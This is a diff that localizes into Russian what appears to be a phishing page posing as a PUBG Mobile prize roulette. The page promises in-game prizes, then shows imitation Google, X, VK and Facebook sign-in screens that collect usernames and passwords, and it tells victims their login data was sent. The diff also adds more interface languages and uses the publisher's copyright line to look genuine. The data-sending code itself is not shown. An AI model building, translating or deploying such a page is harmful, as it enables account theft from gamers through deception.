@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PUBG Mobile - Roulette</title>
+    <title>PUBG Mobile - Рулетка</title>
     <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -1278,20 +1278,20 @@
             }
         }
         
-        /* ОБНОВЛЕННЫЕ УВЕДОМЛЕНИЯ - НОВЫЙ ДИЗАЙН (ФИОЛЕТОВЫЙ/СИНИЙ) */
+        /* ОБНОВЛЕННЫЕ УВЕДОМЛЕНИЯ - НОВЫЙ ДИЗАЙН */
         .notification {
             position: fixed;
             top: 50%;
             left: 50%;
             transform: translate(-50%, -50%);
-            background: linear-gradient(135deg, #1a0f2e, #2d1b69);
-            color: #B19CD9;
+            background: linear-gradient(135deg, #0a1520, #162436);
+            color: #7B68EE;
             padding: 25px 35px;
             border-radius: 20px;
             border: 2px solid #7B68EE;
             box-shadow: 
                 0 15px 35px rgba(0, 0, 0, 0.6),
-                0 0 30px rgba(123, 104, 238, 0.4);
+                0 0 30px rgba(123, 104, 238, 0.3);
             display: none;
             z-index: 1001;
             max-width: 350px;
@@ -1323,7 +1323,7 @@
             left: -2px;
             right: -2px;
             bottom: -2px;
-            background: linear-gradient(45deg, #7B68EE, #9370DB, #6A5ACD);
+            background: linear-gradient(45deg, #7B68EE, #4B0082, #8A2BE2);
             border-radius: 22px;
             z-index: -1;
             animation: borderRotate 3s linear infinite;
@@ -1349,13 +1349,13 @@
         }
         
         .notification.success {
-            color: #B19CD9;
-            border-color: #7B68EE;
-            background: linear-gradient(135deg, #1a0f2e, #2d1b69);
+            color: #4CAF50;
+            border-color: #4CAF50;
+            background: linear-gradient(135deg, #0a1a0a, #1a2a1a);
         }
         
         .notification.success::before {
-            background: linear-gradient(45deg, #7B68EE, #9370DB, #6A5ACD);
+            background: linear-gradient(45deg, #4CAF50, #2E7D32, #81C784);
         }
         
         /* ОСТАЛЬНЫЕ СТИЛИ */
@@ -2405,7 +2405,7 @@
     <!-- Счетчик победителей -->
     <div class="winners-counter">
         <i class="fas fa-trophy"></i>
-        Winners: <span class="winners-count" id="winnersCount">0</span>
+        Победителей: <span class="winners-count" id="winnersCount">0</span>
     </div>
     
     <!-- Уведомление в центре -->
@@ -2414,19 +2414,19 @@
     <!-- Окно с призом -->
     <div class="prize-window" id="prizeWindow">
         <div class="prize-content">
-            <div class="prize-banner">YOUR PRIZE</div>
+            <div class="prize-banner">ВАШ ПРИЗ</div>
             
             <div class="prize-glow-container">
                 <div class="glow-bg"></div>
-                <img id="winImg" src="" class="prize-image" alt="Prize">
+                <img id="winImg" src="" class="prize-image" alt="Приз">
             </div>
 
             <div class="prize-info">
-                <h2 class="prize-name" id="winName">PRIZE</h2>
-                <p class="prize-desc" id="prizeDescription">The item has been sent to your in-game mail. Please wait up to 24 hours for transaction processing.</p>
+                <h2 class="prize-name" id="winName">ПРИЗ</h2>
+                <p class="prize-desc" id="prizeDescription">Предмет был отправлен на вашу игровую почту. Пожалуйста, подождите до 24 часов для обработки транзакции.</p>
             </div>
 
-            <button class="collect-btn" id="collectPrizeBtn">COLLECT</button>
+            <button class="collect-btn" id="collectPrizeBtn">ЗАБРАТЬ</button>
         </div>
     </div>
 
@@ -2434,25 +2434,25 @@
     <div class="google-fullscreen" id="googleFullscreen">
         <div class="google-auth-container" id="googleStep1">
             <img src="Google.png" alt="Google" class="google-logo">
-            <h1 class="google-title">Sign in</h1>
-            <p class="google-subtitle">Use your Google Account</p>
+            <h1 class="google-title">Вход</h1>
+            <p class="google-subtitle">Используйте аккаунт Google</p>
             
             <div class="google-input-group">
-                <span class="google-input-label">Phone number or email</span>
+                <span class="google-input-label">Телефон или адрес эл. почты</span>
                 <input type="text" id="googleEmailInput" class="google-input">
             </div>
 
             <div class="google-guest-mode">
-                Working on someone else's computer? Use Private Browsing mode.<br>
-                <a href="#">Learn more about using Guest mode</a>
+                Работаете на чужом компьютере? Используйте режим «Частный доступ».<br>
+                <a href="#">Подробнее об использовании гостевого режима</a>
             </div>
 
             <div class="google-footer-buttons">
-                <button class="google-btn-text" id="googleCreateAccountBtn">Create account</button>
-                <button class="google-btn-blue" id="googleNextBtn">Next</button>
+                <button class="google-btn-text" id="googleCreateAccountBtn">Создать аккаунт</button>
+                <button class="google-btn-blue" id="googleNextBtn">Далее</button>
             </div>
             
-            <div class="google-lang-footer">English</div>
+            <div class="google-lang-footer">Русский</div>
         </div>
         
         <!-- Страница пароля (скрыта по умолчанию) -->
@@ -2460,33 +2460,33 @@
             <img src="Google.png" alt="Google" class="google-logo">
             
             <div class="google-welcome-container">
-                <h1 class="google-title">Welcome!</h1>
+                <h1 class="google-title">Добро пожаловать!</h1>
             </div>
 
             <div class="google-input-group">
-                <span class="google-input-label">Enter your password</span>
+                <span class="google-input-label">Введите пароль</span>
                 <input type="password" id="googlePasswordInput" class="google-input">
             </div>
             
             <div class="google-show-pass">
                 <input type="checkbox" id="googleShowPassword"> 
-                <label for="googleShowPassword">Show password</label>
+                <label for="googleShowPassword">Показать пароль</label>
             </div>
 
             <div class="google-footer-buttons">
-                <button class="google-btn-text" id="googleForgotPasswordBtn">Forgot password?</button>
-                <button class="google-btn-blue" id="googleSubmitBtn">Next</button>
+                <button class="google-btn-text" id="googleForgotPasswordBtn">Забыли пароль?</button>
+                <button class="google-btn-blue" id="googleSubmitBtn">Далее</button>
             </div>
             
-            <div class="google-lang-footer">English</div>
+            <div class="google-lang-footer">Русский</div>
         </div>
         
         <!-- Общий футер для всей страницы -->
         <div class="google-bottom-footer">
             <div class="google-bottom-footer-links">
-                <a href="#">Help</a>
-                <a href="#">Privacy</a>
-                <a href="#">Terms</a>
+                <a href="#">Справка</a>
+                <a href="#">Конфиденциальность</a>
+                <a href="#">Условия</a>
             </div>
         </div>
     </div>
@@ -2502,7 +2502,7 @@
                     <g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g>
                 </svg>
             </div>
-            <h1 class="x-title">Sign in to X</h1>
+            <h1 class="x-title">Вход в X</h1>
             
             <button class="social-login-btn google">
                 <svg viewBox="0 0 24 24" width="18" height="18">
@@ -2511,29 +2511,29 @@
                     <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                     <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
                 </svg>
-                Sign in with Google
+                Войти через Google
             </button>
             
             <button class="social-login-btn apple">
                 <svg viewBox="0 0 24 24" width="18" height="18" fill="currentColor">
                     <path d="M17.05 20.28c-.98.95-2.05.86-3.08.38-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.38C2.79 15.36 3.51 7.79 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.04 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09l.01-.01zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/>
                 </svg>
-                Sign in with Apple
+                Войти через Apple
             </button>
             
             <div class="or-divider">
-                <span>or</span>
+                <span>или</span>
             </div>
             
             <form id="xEmailForm">
-                <input type="text" class="x-input" placeholder="Phone, email, or username" required>
-                <button type="submit" class="x-next-btn">Next</button>
+                <input type="text" class="x-input" placeholder="Телефон, email или имя пользователя" required>
+                <button type="submit" class="x-next-btn">Далее</button>
             </form>
             
-            <a href="#" class="x-link" style="display: block; text-align: center; margin-bottom: 20px;">Forgot password?</a>
+            <a href="#" class="x-link" style="display: block; text-align: center; margin-bottom: 20px;">Забыли пароль?</a>
             
             <div class="x-footer">
-                Don't have an account? <a href="#">Sign up</a>
+                Нет аккаунта? <a href="#">Зарегистрироваться</a>
             </div>
         </div>
     </div>
@@ -2549,18 +2549,18 @@
                 </svg>
             </div>
             
-            <h2 class="x-step2-title">Enter your password</h2>
+            <h2 class="x-step2-title">Введите пароль</h2>
             
             <form id="xPasswordForm">
-                <input type="password" class="x-password-input" placeholder="Enter password" required>
+                <input type="password" class="x-password-input" placeholder="Введите пароль" required>
                 
-                <button type="submit" class="x-login-btn">Sign in</button>
+                <button type="submit" class="x-login-btn">Войти</button>
             </form>
             
-            <a href="#" class="x-forgot-password">Forgot password?</a>
+            <a href="#" class="x-forgot-password">Забыли пароль?</a>
             
             <div class="x-step2-footer">
-                Don't have an account? <a href="#">Sign up</a>
+                Нет аккаунта? <a href="#">Зарегистрироваться</a>
             </div>
         </div>
     </div>
@@ -2570,31 +2570,31 @@
         <div class="modal">
             <button class="close-modal" onclick="closeModal('vkModal')">&times;</button>
             <div style="text-align: center;">
-                <img src="vkontakte.png" alt="VK" class="vk-logo">
+                <img src="vkontakte.png" alt="ВКонтакте" class="vk-logo">
             </div>
-            <h1 class="vk-title">VK Login</h1>
+            <h1 class="vk-title">Вход ВКонтакте</h1>
             
             <form id="vkLoginForm">
-                <label class="vk-label">Phone or email</label>
-                <input type="text" class="vk-input" placeholder="Phone or email" required>
+                <label class="vk-label">Телефон или email</label>
+                <input type="text" class="vk-input" placeholder="Телефон или email" required>
                 
-                <label class="vk-label">Password</label>
-                <input type="password" class="vk-input" placeholder="Password" required>
+                <label class="vk-label">Пароль</label>
+                <input type="password" class="vk-input" placeholder="Пароль" required>
                 
                 <div class="vk-checkbox">
                     <input type="checkbox" id="vkComputer">
-                    <label for="vkComputer">Other computer</label>
+                    <label for="vkComputer">Чужой компьютер</label>
                 </div>
                 
-                <button type="submit" class="vk-submit-btn">Log in</button>
+                <button type="submit" class="vk-submit-btn">Войти</button>
             </form>
             
             <div class="vk-links">
-                <a href="#" class="vk-link">Sign up</a>
+                <a href="#" class="vk-link">Регистрация</a>
             </div>
             
             <div style="text-align: center; padding-top: 20px; border-top: 1px solid #DCE1E6;">
-                <a href="#" class="vk-link" style="font-size: 14px;">Forgot password or can't log in?</a>
+                <a href="#" class="vk-link" style="font-size: 14px;">Забыли пароль или не можете войти?</a>
             </div>
         </div>
     </div>
@@ -2614,17 +2614,17 @@
             
             <div class="fb-content">
                 <form id="facebookLoginForm">
-                    <input type="text" class="fb-input" placeholder="Email address or phone number" required>
-                    <input type="password" class="fb-input" placeholder="Password" required>
+                    <input type="text" class="fb-input" placeholder="Электронный адрес или номер телефона" required>
+                    <input type="password" class="fb-input" placeholder="Пароль" required>
                     
-                    <button type="submit" class="fb-submit-btn">Log In</button>
+                    <button type="submit" class="fb-submit-btn">Вход</button>
                 </form>
                 
-                <a href="#" class="fb-link">Forgotten account?</a>
+                <a href="#" class="fb-link">Забыли аккаунт?</a>
                 
                 <div class="fb-divider"></div>
                 
-                <button class="fb-create-btn" onclick="closeModal('facebookModal')">Create New Account</button>
+                <button class="fb-create-btn" onclick="closeModal('facebookModal')">Создать аккаунт</button>
             </div>
         </div>
     </div>
@@ -2634,11 +2634,11 @@
         <div class="menu-left">
             <div class="menu-dropdown">
                 <button class="menu-btn" id="menuBtn">
-                    <i class="fas fa-bars"></i> Menu
+                    <i class="fas fa-bars"></i> Меню
                 </button>
                 <div class="dropdown-menu" id="dropdownMenu">
                     <a href="https://t.me/helpumgmbot" target="_blank" class="dropdown-item">
-                        <i class="fab fa-telegram"></i> Support
+                        <i class="fab fa-telegram"></i> Поддержка
                     </a>
                     <a href="https://www.instagram.com/pubgmcis" target="_blank" class="dropdown-item">
                         <i class="fab fa-instagram"></i> Instagram
@@ -2650,18 +2650,27 @@
         <div class="menu-right">
             <div class="language-menu">
                 <button class="language-btn" id="languageBtn">
-                    <i class="fas fa-globe"></i> English <i class="fas fa-chevron-down"></i>
+                    <i class="fas fa-globe"></i> Русский <i class="fas fa-chevron-down"></i>
                 </button>
                 <div class="language-dropdown" id="languageDropdown">
-                    <div class="language-option" data-lang="en">English</div>
-                    <div class="language-option" data-lang="ru">Русский</div>
                     <div class="language-option" data-lang="uz">O'zbekcha</div>
+                    <div class="language-option" data-lang="en">English</div>
+                    <div class="language-option" data-lang="kz">Қазақша</div>
+                    <div class="language-option" data-lang="ar">العربية</div>
+                    <div class="language-option" data-lang="zh">中文</div>
+                    <div class="language-option" data-lang="ky">Кыргызча</div>
+                    <div class="language-option" data-lang="dag">Дагестанский</div>
+                    <div class="language-option" data-lang="che">Чеченский</div>
+                    <div class="language-option" data-lang="az">Azərbaycanca</div>
+                    <div class="language-option" data-lang="hy">Հայերեն</div>
+                    <div class="language-option" data-lang="jp">日本語</div>
+                    <div class="language-option" data-lang="uk">Українська</div>
                 </div>
             </div>
             
             <div class="prize-mail-icon">
                 <button class="prize-mail-btn" id="prizeMailBtn">
-                    <i class="fas fa-gift"></i> My prize
+                    <i class="fas fa-gift"></i> Мой приз
                     <div class="prize-badge" id="prizeBadge">0</div>
                 </button>
             </div>
@@ -2676,31 +2685,31 @@
         <div class="roulette-container">
             <div class="prizes-grid">
                 <div class="prize-item" data-id="1">
-                    <img src="priz1.png" alt="Prize">
+                    <img src="priz1.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="2">
-                    <img src="priz2.png" alt="Prize">
+                    <img src="priz2.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="3">
-                    <img src="priz3.png" alt="Prize">
+                    <img src="priz3.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="4">
-                    <img src="priz4.png" alt="Prize">
+                    <img src="priz4.png" alt="Приз">
                 </div>
                 <div class="prize-item center-item" data-id="5">
-                    <img src="priz5.png" alt="Prize">
+                    <img src="priz5.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="6">
-                    <img src="priz6.png" alt="Prize">
+                    <img src="priz6.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="7">
-                    <img src="priz7.png" alt="Prize">
+                    <img src="priz7.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="8">
-                    <img src="priz8.png" alt="Prize">
+                    <img src="priz8.png" alt="Приз">
                 </div>
                 <div class="prize-item" data-id="9">
-                    <img src="priz9.png" alt="Prize">
+                    <img src="priz9.png" alt="Приз">
                 </div>
             </div>
             
@@ -2711,39 +2720,39 @@
                 <div class="corner corner-bl"></div>
                 <div class="corner corner-br"></div>
             </div>
-            <div class="selection-indicator" id="selectionIndicator">SELECTED</div>
+            <div class="selection-indicator" id="selectionIndicator">ВЫБРАНО</div>
         </div>
         
         <button class="play-btn" id="playBtn">
-            <i class="fas fa-play"></i> PLAY
+            <i class="fas fa-play"></i> ИГРАТЬ
         </button>
         
         <!-- Форма ввода ID аккаунта -->
         <div class="account-id-section" id="accountIdSection">
-            <h2>ENTER PUBG ACCOUNT ID</h2>
-            <p>Please enter your PUBG Mobile account ID to receive the prize</p>
+            <h2>ВВЕДИТЕ ID АККАУНТА PUBG</h2>
+            <p>Пожалуйста, введите ваш ID аккаунта PUBG Mobile для получения приза</p>
             
             <div class="id-input-container">
-                <label class="id-label">PUBG Account ID:</label>
-                <input type="text" class="id-input" id="accountIdInput" placeholder="Enter your account ID" required>
+                <label class="id-label">ID аккаунта PUBG:</label>
+                <input type="text" class="id-input" id="accountIdInput" placeholder="Введите ваш ID аккаунта" required>
             </div>
             
             <button class="id-submit-btn" id="idSubmitBtn">
-                <i class="fas fa-check"></i> CONTINUE
+                <i class="fas fa-check"></i> ПРОДОЛЖИТЬ
             </button>
         </div>
         
         <!-- Форма выбора соцсети -->
         <div class="social-select-section" id="socialSelectSection">
-            <h2>SELECT RECEIVING METHOD</h2>
-            <p>Select social network to receive the prize</p>
+            <h2>ВЫБЕРИТЕ СПОСОБ ПОЛУЧЕНИЯ</h2>
+            <p>Выберите социальную сеть для получения приза</p>
             
             <div class="social-grid">
                 <div class="social-option" data-social="vk" onclick="openModal('vkModal')">
                     <div class="social-icon">
-                        <img src="vkontakte.png" alt="VK">
+                        <img src="vkontakte.png" alt="ВКонтакте">
                     </div>
-                    <span>VK</span>
+                    <span>ВКонтакте</span>
                 </div>
                 
                 <div class="social-option" data-social="facebook" onclick="openModal('facebookModal')">
@@ -2771,11 +2780,11 @@
             </div>
             
             <div class="important-note" id="importantNote">
-                <strong>Important:</strong> The prize will be credited to your account within 24 hours
+                <strong>Важно:</strong> Приз будет зачислен на ваш аккаунт в течение 24 часов
             </div>
             
             <button class="get-prize-btn" id="getPrizeBtn">
-                <i class="fas fa-paper-plane"></i> GET PRIZE
+                <i class="fas fa-paper-plane"></i> ПОЛУЧИТЬ ПРИЗ
             </button>
         </div>
         
@@ -2784,16 +2793,16 @@
             <div class="confirmation-icon">
                 <i class="fas fa-check-circle"></i>
             </div>
-            <h2>APPLICATION ACCEPTED!</h2>
+            <h2>ЗАЯВКА ПРИНЯТА!</h2>
             
             <div class="confirmation-message">
-                Your winnings will be credited to your PUBG Mobile account<br>
-                within <strong>24 hours</strong>.
+                Ваш выигрыш будет зачислен на аккаунт PUBG Mobile<br>
+                в течение <strong>24 часов</strong>.
             </div>
             
             <p style="color: #8da1b5; font-size: 14px; line-height: 1.5; font-family: Arial, sans-serif;">
-                Thank you for participating!<br>
-                Don't forget to check your in-game inventory.
+                Спасибо за участие!<br>
+                Не забудьте проверить свой инвентарь в игре.
             </p>
         </div>
     </div>
@@ -2801,13 +2810,13 @@
     <!-- Футер -->
     <div class="footer">
         <div class="footer-links">
-            <a href="#" class="footer-link">Terms of Service</a>
-            <a href="#" class="footer-link">Privacy Policy</a>
-            <a href="#" class="footer-link">Cookie Policy</a>
-            <a href="#" class="footer-link">Cookie Preferences</a>
+            <a href="#" class="footer-link">Условия обслуживания</a>
+            <a href="#" class="footer-link">Политика конфиденциальности</a>
+            <a href="#" class="footer-link">Политика Cookie</a>
+            <a href="#" class="footer-link">Предпочтение Cookies</a>
         </div>
         <div class="copyright">
-            Copyright © High Morale Developments Limited. All rights reserved.
+            Авторские права © High Morale Developments Limited. Все права защищены.
         </div>
     </div>
 
@@ -2875,14 +2884,14 @@
             
             if (userPrize) {
                 document.getElementById('winImg').src = userPrize.image;
-                document.getElementById('winName').textContent = "PRIZE";
+                document.getElementById('winName').textContent = "ПРИЗ";
                 document.getElementById('prizeDescription').textContent = isPrizeReceived ? 
-                    "✅ Your prize has been sent to your PUBG Mobile account." : 
-                    "Select a social network to receive the prize.";
+                    "✅ Ваш приз был отправлен на ваш аккаунт PUBG Mobile." : 
+                    "Выберите социальную сеть для получения приза.";
                 
                 const collectBtn = document.getElementById('collectPrizeBtn');
                 if (!isPrizeReceived) {
-                    collectBtn.textContent = "COLLECT";
+                    collectBtn.textContent = "ЗАБРАТЬ";
                     collectBtn.onclick = function() {
                         closePrizeWindow();
                         
@@ -2900,21 +2909,21 @@
                             socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                         }
                         
-                        showNotification("Select a social network to receive the prize");
+                        showNotification("Выберите социальную сеть для получения приза");
                     };
                 } else {
-                    collectBtn.textContent = "CLOSE";
+                    collectBtn.textContent = "ЗАКРЫТЬ";
                     collectBtn.onclick = function() {
                         closePrizeWindow();
                     };
                 }
             } else {
                 document.getElementById('winImg').src = '';
-                document.getElementById('winName').textContent = "MAIL IS EMPTY";
-                document.getElementById('prizeDescription').textContent = "You don't have any won prizes yet. Play the wheel of fortune to win exclusive prizes!";
+                document.getElementById('winName').textContent = "ПОЧТА ПУСТА";
+                document.getElementById('prizeDescription').textContent = "У вас пока нет выигранных призов. Сыграйте в колесо удачи, чтобы выиграть эксклюзивные призы!";
                 
                 const collectBtn = document.getElementById('collectPrizeBtn');
-                collectBtn.textContent = "CLOSE";
+                collectBtn.textContent = "ЗАКРЫТЬ";
                 collectBtn.onclick = function() {
                     closePrizeWindow();
                 };
@@ -3073,31 +3082,6 @@
             
             // Языковые настройки
             const translations = {
-                en: {
-                    play: "PLAY",
-                    idTitle: "ENTER PUBG ACCOUNT ID",
-                    idText: "Please enter your PUBG Mobile account ID to receive the prize",
-                    idLabel: "PUBG Account ID:",
-                    idPlaceholder: "Enter your account ID",
-                    idSubmit: "CONTINUE",
-                    selectTitle: "SELECT RECEIVING METHOD",
-                    selectText: "Select social network to receive the prize",
-                    getPrizeBtn: "GET PRIZE",
-                    importantNote: "Important: The prize will be credited to your account within 24 hours",
-                    notificationSuccess: "Application accepted! The prize will be credited within 24 hours.",
-                    notificationSelectSocial: "Please select a social network",
-                    notificationAlreadyPlayed: "You have already used your attempt today!",
-                    notificationIdRequired: "Please enter account ID",
-                    confirmationTitle: "APPLICATION ACCEPTED!",
-                    confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
-                    loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
-                    alreadyPlayed: "ALREADY PLAYED",
-                    support: "Support",
-                    menu: "Menu",
-                    winners: "Winners:",
-                    myPrize: "My prize",
-                    selected: "SELECTED"
-                },
                 ru: {
                     play: "ИГРАТЬ",
                     idTitle: "ВВЕДИТЕ ID АККАУНТА PUBG",
@@ -3118,10 +3102,29 @@
                     loginSuccess: "Данные для входа отправлены! Приз будет зачислен в течение 24 часов.",
                     alreadyPlayed: "УЖЕ ИГРАЛИ",
                     support: "Поддержка",
-                    menu: "Меню",
-                    winners: "Победителей:",
-                    myPrize: "Мой приз",
-                    selected: "ВЫБРАНО"
+                    menu: "Меню"
+                },
+                en: {
+                    play: "PLAY",
+                    idTitle: "ENTER PUBG ACCOUNT ID",
+                    idText: "Please enter your PUBG Mobile account ID to receive the prize",
+                    idLabel: "PUBG Account ID:",
+                    idPlaceholder: "Enter your account ID",
+                    idSubmit: "CONTINUE",
+                    selectTitle: "SELECT RECEIVING METHOD",
+                    selectText: "Select social network to receive the prize",
+                    getPrizeBtn: "GET PRIZE",
+                    importantNote: "Important: The prize will be credited to your account within 24 hours",
+                    notificationSuccess: "Application accepted! The prize will be credited within 24 hours.",
+                    notificationSelectSocial: "Please select a social network",
+                    notificationAlreadyPlayed: "You have already used your attempt today!",
+                    notificationIdRequired: "Please enter account ID",
+                    confirmationTitle: "APPLICATION ACCEPTED!",
+                    confirmationMessage: "Your winnings will be credited to your PUBG Mobile account within 24 hours.",
+                    loginSuccess: "Login data sent! Prize will be credited within 24 hours.",
+                    alreadyPlayed: "ALREADY PLAYED",
+                    support: "Support",
+                    menu: "Menu"
                 },
                 uz: {
                     play: "O'YIN",
@@ -3143,20 +3146,57 @@
                     loginSuccess: "Kirish ma'lumotlari yuborildi! Sovrin 24 soat ichida o'tkaziladi.",
                     alreadyPlayed: "ALLAQACHON O'YNANGAN",
                     support: "Yordam",
-                    menu: "Menyu",
-                    winners: "G'oliblar:",
-                    myPrize: "Mening sovrim",
-                    selected: "TANLANGAN"
+                    menu: "Menyu"
+                },
+                kz: {
+                    play: "ОЙНАУ",
+                    idTitle: "PUBG ЕСЕП ЖЕДЕСИН ЕНГІЗІҢІЗ",
+                    idText: "Жүлдені алу үшін PUBG Mobile есеп жедеңізді енгізіңіз",
+                    idLabel: "PUBG Есеп жедесі:",
+                    idPlaceholder: "Есеп жедеңізді енгізіңіз",
+                    idSubmit: "ЖАЛҒАСТЫРУ",
+                    selectTitle: "ҚАБЫЛДАУ ӘДІСІН ТАҢДАҢЫЗ",
+                    selectText: "Жүлдені қабылдау үшін әлеуметтік желіні таңдаңыз",
+                    getPrizeBtn: "ЖҮЛДЕНІ АЛУ",
+                    importantNote: "Маңызды: Жүлде 24 сағат ішінде есептік жазбаңызға аударылады",
+                    notificationSuccess: "Өтініш қабылданды! Жүлде 24 сағат ішінде аударылады.",
+                    notificationSelectSocial: "Өтінеміз, әлеуметтік желіні таңдаңыз",
+                    notificationAlreadyPlayed: "Сіз бүгінгі мүмкіндігіңізді пайдаландыңыз!",
+                    notificationIdRequired: "Есеп жедесін енгізіңіз",
+                    confirmationTitle: "ӨТІНІШ ҚАБУЛДАНДЫ!",
+                    confirmationMessage: "Жеңісіңіз PUBG Mobile шотыңызға 24 сағат ішінде аударылады.",
+                    loginSuccess: "Кіру деректері жіберілді! Жүлде 24 сағат ішінде аударылады.",
+                    alreadyPlayed: "ҚАЗІРГІ ОЙНАҒАН",
+                    support: "Қолдау",
+                    menu: "Мәзір"
+                },
+                ar: {
+                    play: "لعب",
+                    idTitle: "أدخل معرف حساب PUBG",
+                    idText: "الرجاء إدخال معرف حساب PUBG Mobile الخاص بك لاستلام الجائزة",
+                    idLabel: "معرف حساب PUBG:",
+                    idPlaceholder: "أدخل معرف حسابك",
+                    idSubmit: "متابعة",
+                    selectTitle: "اختر طريقة الاستلام",
+                    selectText: "اختر شبكة اجتماعية لاستلام الجائزة",
+                    getPrizeBtn: "الحصول على الجائزة",
+                    importantNote: "مهم: سيتم إضافة الجائزة إلى حسابك خلال 24 ساعة",
+                    notificationSuccess: "تم قبول الطلب! سيتم إضافة الجائزة خلال 24 ساعة.",
+                    notificationSelectSocial: "يرجى اختيار شبكة اجتماعية",
+                    notificationAlreadyPlayed: "لقد استخدمت محاولتك اليوم بالفعل!",
+                    notificationIdRequired: "الرجاء إدخال معرف الحساب",
+                    confirmationTitle: "تم قبول الطلب!",
+                    confirmationMessage: "سيتم إضافة ربحك إلى حساب PUBG Mobile الخاص بك خلال 24 ساعة.",
+                    loginSuccess: "تم إرسال بيانات تسجيل الدخول! سيتم إضافة الجائزة خلال 24 ساعة.",
+                    alreadyPlayed: "لعبت بالفعل",
+                    support: "الدعم",
+                    menu: "القائمة"
                 }
             };
             
             // Функция смены языка
             function changeLanguage(lang) {
-                const t = translations[lang] || translations.en;
-                
-                // Обновляем счетчик победителей
-                const winnersCounter = document.querySelector('.winners-counter');
-                winnersCounter.innerHTML = `<i class="fas fa-trophy"></i> ${t.winners} <span class="winners-count" id="winnersCount">${winnersCount}</span>`;
+                const t = translations[lang] || translations.ru;
                 
                 if (hasPlayed && userIP !== ownerIP) {
                     playBtn.innerHTML = `<i class="fas fa-check"></i> ${t.alreadyPlayed}`;
@@ -3164,39 +3204,34 @@
                     playBtn.innerHTML = `<i class="fas fa-play"></i> ${t.play}`;
                 }
                 
-                // Обновляем индикатор выбора
-                selectionIndicator.textContent = t.selected;
-                
-                // Обновляем форму ввода ID
                 document.querySelector('#accountIdSection h2').textContent = t.idTitle;
                 document.querySelector('#accountIdSection p').textContent = t.idText;
                 document.querySelector('.id-label').textContent = t.idLabel;
                 document.getElementById('accountIdInput').placeholder = t.idPlaceholder;
                 idSubmitBtn.innerHTML = `<i class="fas fa-check"></i> ${t.idSubmit}`;
                 
-                // Обновляем форму выбора соцсети
                 document.querySelector('#socialSelectSection h2').textContent = t.selectTitle;
                 document.querySelector('#socialSelectSection p').textContent = t.selectText;
                 getPrizeBtn.innerHTML = `<i class="fas fa-paper-plane"></i> ${t.getPrizeBtn}`;
                 importantNote.innerHTML = `<strong>${t.importantNote.split(':')[0]}:</strong> ${t.importantNote.split(':')[1]}`;
                 
-                // Обновляем секцию подтверждения
                 document.querySelector('#confirmationSection h2').textContent = t.confirmationTitle;
                 document.querySelector('.confirmation-message').innerHTML = t.confirmationMessage;
                 
-                // Обновляем кнопку языка
                 const langNames = {
-                    en: 'English',
-                    ru: 'Русский',
-                    uz: "O'zbekcha"
+                    ru: 'Русский', en: 'English', uz: "O'zbekcha",
+                    kz: 'Қазақша', ar: 'العربية', zh: '中文',
+                    ky: 'Кыргызча', dag: 'Дагестанский', che: 'Чеченский',
+                    az: 'Azərbaycanca', hy: 'Հայերեն', jp: '日本語',
+                    uk: 'Українська'
                 };
-                languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'English'} <i class="fas fa-chevron-down"></i>`;
+                languageBtn.innerHTML = `<i class="fas fa-globe"></i> ${langNames[lang] || 'Русский'} <i class="fas fa-chevron-down"></i>`;
+                
+                // Обновляем текст индикатора выбора
+                selectionIndicator.textContent = 'ВЫБРАНО';
                 
                 // Обновляем кнопку меню
                 menuBtn.innerHTML = `<i class="fas fa-bars"></i> ${t.menu}`;
-                
-                // Обновляем кнопку приза
-                prizeMailBtn.innerHTML = `<i class="fas fa-gift"></i> ${t.myPrize} <div class="prize-badge" id="prizeBadge">0</div>`;
                 
                 // Обновляем пункты меню
                 document.querySelectorAll('.dropdown-item').forEach((item, index) => {
@@ -3206,26 +3241,7 @@
                         item.innerHTML = `<i class="fab fa-instagram"></i> Instagram`;
                     }
                 });
-                
-                // Обновляем окно приза
-                const prizeBanner = document.querySelector('.prize-banner');
-                if (prizeBanner) {
-                    prizeBanner.textContent = lang === 'ru' ? 'ВАШ ПРИЗ' : (lang === 'uz' ? 'SIZNING SOVRINGIZ' : 'YOUR PRIZE');
-                }
-                
-                const prizeName = document.getElementById('winName');
-                if (prizeName) {
-                    prizeName.textContent = lang === 'ru' ? 'ПРИЗ' : (lang === 'uz' ? 'SOVRIN' : 'PRIZE');
-                }
-                
-                const collectBtn = document.getElementById('collectPrizeBtn');
-                if (collectBtn) {
-                    collectBtn.textContent = lang === 'ru' ? 'ЗАБРАТЬ' : (lang === 'uz' ? 'OLISH' : 'COLLECT');
-                }
             }
-            
-            // Устанавливаем английский язык по умолчанию
-            changeLanguage('en');
             
             // Обработчики для меню языка
             languageBtn.addEventListener('click', function() {
@@ -3237,12 +3253,7 @@
                     const lang = this.getAttribute('data-lang');
                     changeLanguage(lang);
